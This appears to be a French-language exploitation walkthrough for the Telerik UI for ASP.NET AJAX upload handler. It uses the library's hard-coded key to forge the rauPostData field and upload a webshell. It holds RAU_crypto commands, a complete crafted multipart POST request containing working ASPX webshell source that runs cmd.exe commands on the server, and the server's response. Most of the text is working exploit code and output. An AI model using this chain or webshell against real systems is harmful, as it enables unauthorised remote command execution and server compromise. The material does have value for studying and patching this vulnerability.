# Webshell exploit - Telerik UI for ASP.NET AJAX

## Exploit
La librairie télérik a une clé hardcodé, ainsi il est possible de décoder le rauPostData, de le modifier puis ensuite de le recoder avec un payload malveillant (webshell).

Lien vulnérable :

https://URL/Telerik.Web.UI.WebResource.axd?type=rau

Comme énnoncé, il est possible de décoder le champ rauPostData à l'aide du script python disponible sur github : https://github.com/bao7uo/RAU_crypto

```
python3 RAU_crypto.py -D "ATTu5i4R+ViNFYO6kst0jC11wM/1iqH+W/isjhaDjNuCI7eJ/BY5d1E9eqZK27CJCMuon9u8/hgRIM/cTlgLlv4qOYjPBjs81Y3dAZAdtIr3TXiCmZi9M09a1BYMxjvGKfVky3b7PoOppeWS/3rgldxu1TGN4BfIe3ZPc2c3sB35eKSQ0h48TaSQv2K/BE4Jh23M1Ac3/ERQgqlx+BhCkdKH6MnBdL5avdiJIYeRgqLjIfzPqHi6jL6PWyXWr/su+RYAwlu...qQFE7IKGs="
```

Une fois décodé, on obtient le résultat suivant :

```
JSON: {"TargetFolder":"jgas0meS/uP/TPzDTw==","TempTargetFolder":"YIGV6iU3FJMHN7xqIJe0atZ4EBwFStKIJ6c3NOaZFEon6eU=","MaxFileSize":31457280,"TimeToLive":{"Hours":4,"Minutes":0,"Seconds":0,"Milliseconds":0,"Ticks":144000000000,"Days":0,"TotalDays":0.16666666666666666,"TotalHours":4,"TotalMilliseconds":14400000,"TotalMinutes":240,"TotalSeconds":14400},"UseApplicationPoolImpersonation":false,"AllowedFileExtensions":[".pdf",".txt",".rtf",".doc",".docx",".docm",".dot",".dotx",".dotm",".csv",".xls",".xlsx",".xlsm",".xlt",".xltx",".xltm",".xlsb",".xlam",".ppt",".pptx",".pptm",".pps",".ppsx",".ppsm",".potx",".potm",".ppam",".sldx",".sldm",".msg",".png",".gif",".jpg",".jp2",".tiff",".bmp",".zip",".xml"]}
```

Les éléments importants à récupérer sont : 

 - TempTargetFolder = **D:\WWW\APP\App_Data\RadUploadTemp** 
 - Version =  **2014.3.1024.40**

Une fois ces éléments récupérés, il va être possible de préparer la requête POST du webshell en aspx via la commande suivavnte : 

```
python3 RAU_crypto2.py -p "D:\WWW\APP" "2014.3.1024.40" shell.aspx
```

(shell.aspx étant le chemin vers le fichier sources du webshell sur notre machine)

Il ne reste plus qu'à renvoyer le formulaire d'upload en modifiant le paramètre rauPostData, le contenu du champ file, ainsi que l'uploadId qui sera le nom de notre webshell qu'on va déposer sur le serveur.


```
POST /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1
Host: URL
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://URL/Image/UploadProcess.aspx
Cache-Control: no-cache
Content-Length: 3995
Content-Type: multipart/form-data; boundary=---------------------------9756552771978474811260608736
Cookie: ASP.NET_SessionId=pyz4ufwttw
Connection: close

-----------------------------9756552771978474811260608736
Content-Disposition: form-data; name="rauPostData"

ATTu5i4R+ViNFY...FE7IKGs=

-----------------------------9756552771978474811260608736
Content-Disposition: form-data; name="file"; filename="blob"
Content-Type: application/octet-stream

<%@ Page Language="VB" Debug="true" %>

<%@ import Namespace="system.IO" %>

<%@ import Namespace="System.Diagnostics" %>



<script runat="server">



Sub RunCmd(Src As Object, E As EventArgs)

  Dim myProcess As New Process()

  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)

  myProcessStartInfo.UseShellExecute = false

  myProcessStartInfo.RedirectStandardOutput = true

  myProcess.StartInfo = myProcessStartInfo

  myProcessStartInfo.Arguments=xcmd.text

  myProcess.Start()



  Dim myStreamReader As StreamReader = myProcess.StandardOutput

  Dim myString As String = myStreamReader.Readtoend()

  myProcess.Close()

  mystring=replace(mystring,"<","&lt;")

  mystring=replace(mystring,">","&gt;")

  result.text= vbcrlf & "<pre>" & mystring & "</pre>"

End Sub



</script>



<html>

<body>

<form runat="server">

<p><asp:Label id="L_p" runat="server" width="80px">Program</asp:Label>

<asp:TextBox id="xpath" runat="server" Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>

<p><asp:Label id="L_a" runat="server" width="80px">Arguments</asp:Label>

<asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user">/c net user</asp:TextBox>

<p><asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"></asp:Button>

<p><asp:Label id="result" runat="server"></asp:Label>

</form>

</body>

</html>

-----------------------------9756552771978474811260608736
Content-Disposition: form-data; name="fileName"

aze.jpg
-----------------------------9756552771978474811260608736
Content-Disposition: form-data; name="contentType"

image/jpeg
-----------------------------9756552771978474811260608736
Content-Disposition: form-data; name="lastModifiedDate"

2017-12-12T20:26:12.000Z
-----------------------------9756552771978474811260608736
Content-Disposition: form-data; name="metadata"

{"TotalChunks":1,"ChunkIndex":0,"TotalFileSize":27775,"UploadID":"shell.aspx","IsSingleChunkUpload":false}
-----------------------------9756552771978474811260608736--
```

Réponse :

```
HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Wed, 20 Jun 2018 14:57:39 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Cache-Control: private
X-AspNet-Version: 
Content-Length: 619

{"fileInfo":{"FileName":"aze.jpg","ContentType":"image/jpeg","ContentLength":1657,"DateJson":"2017-12-12T20:26:12.000Z","Index":0}, "metaData":"CS8S/Z0J/b2982DRxDin0BBslA7fI0cWMuWlPu4W3FnNOs7VxBpjTqF/KbG9UGJsxKh5U7y7dwOs9mh76GOdBONL03/qL+TB4qbl6aSL5Gb/NdrY/hxEfmzfS+ZfJyYp7oTkhxWPzL+wf+uIPRQkufxCOGaPx3/KmDen+xMjfMqiprf4he4lAyq7g+sCm+mj6B24nCQAAiCegue/21Mrjd0o34x20/lFf82UcLCLpGASd9fAmfSloWakoJIMFj48Mf0Iov3JOw03Zfu2FMSlmEnkhZtflIIJxdFvw6fRcYkl+ZGRGnEAtljzxrlhqyPigEwEjOSSLnJCyFAWJzab5eeeu/VuFGGdMXB6cBbLleT0UVgUtl0BD6hn48RhHAIkkF1SyIu6ht96OyAu4n9oaGRhmojjyMQ4Lw+HE3TVF516Y028+xqZM3UdErg7JL9GoTtU4rjMzQFpEMTM7XBOZw==" }
```

Décodage des métadata :

```
{"TempFileName":"shell.aspx","AsyncUploadTypeName":"Telerik.Web.UI.UploadedFileInfo, Telerik.Web.UI, Version=2014.3.1024.40, Culture=neutral, PublicKeyToken=121fae78165ba3d4"}
```

## Liens :
https://www.the-s-unit.nl/node/78

http://www.acenyethehackerguy.com/2017/11/the-issue-asyncuploadhandler-in.html

https://github.com/straightblast/UnRadAsyncUpload/wiki

https://github.com/bao7uo/RAU_crypto
